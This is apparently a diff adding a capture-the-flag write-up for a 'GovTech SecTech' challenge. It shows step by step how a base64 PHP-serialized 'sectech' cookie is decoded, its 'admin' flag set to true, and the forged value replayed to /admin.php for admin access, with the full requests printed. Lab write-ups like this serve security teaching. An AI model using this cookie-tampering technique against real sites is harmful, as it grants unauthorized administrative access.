@@ -83,7 +83,7 @@ Connection: close
 Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MDt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id= c81e728d9d4c2f636f067f89cc14862c
 Upgrade-Insecure-Requests: 1
 ``````
-In Burp Suite, we can view the table
+We can forward it to our browser for viewing
 ``````
 Item 	Value
 Name 	Billie Jean
@@ -95,3 +95,51 @@ Flag 	WH2020{ID0R_D0_N0T_TRUST_US3R_INPUT}
 
 Flag:
 WH2020{ID0R_D0_N0T_TRUST_US3R_INPUT}
+
+# GovTech SecTech (3/6) - Insecure Deserialization
+### Description
+Trusting serialized data without verification them can be precarious. To this end, we ask that you be like the Cookie Monster, attentive and inquisitive.
+### Solution
+We notice again in Burp
+``````
+GET /admin.php HTTP/1.1
+Host: sec-tech.cf
+User-Agent: XXXXXXX
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MDt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id= c81e728d9d4c2f636f067f89cc14862c
+Upgrade-Insecure-Requests: 1
+``````
+We have a 'sectech' parameter in the 'Cookie:' header - It looks like a base64 encoded string.
+We can use Burp's Decoder functionality to decode it
+``````
+Input:
+YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MDt9
+Output: 
+a:2:{s:4:"user";s:8:"temp_acc";s:5:"admin";b:0;}
+``````
+We notice the 'admin' parameter of the body, this means that our access to the admin functionality is determined by user controlled input!!! We can change the parameter to '1' again using Burp's decoder functionality
+``````
+Input:
+a:2:{s:4:"user";s:8:"temp_acc";s:5:"admin";b:1;}
+Output: 
+YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MTt9
+``````
+Changing the 'sectech' parameter to our output shown above.
+``````
+GET /admin.php HTTP/1.1
+Host: sec-tech.cf
+User-Agent: XXXXXXX
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MTt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id= c81e728d9d4c2f636f067f89cc14862c
+Upgrade-Insecure-Requests: 1
+``````
+And we receive the flag!
+Flag: WH2020{Cook!3Ins3cur3Des3r!al!zat!on_Adm!nR!ghts}
+
+
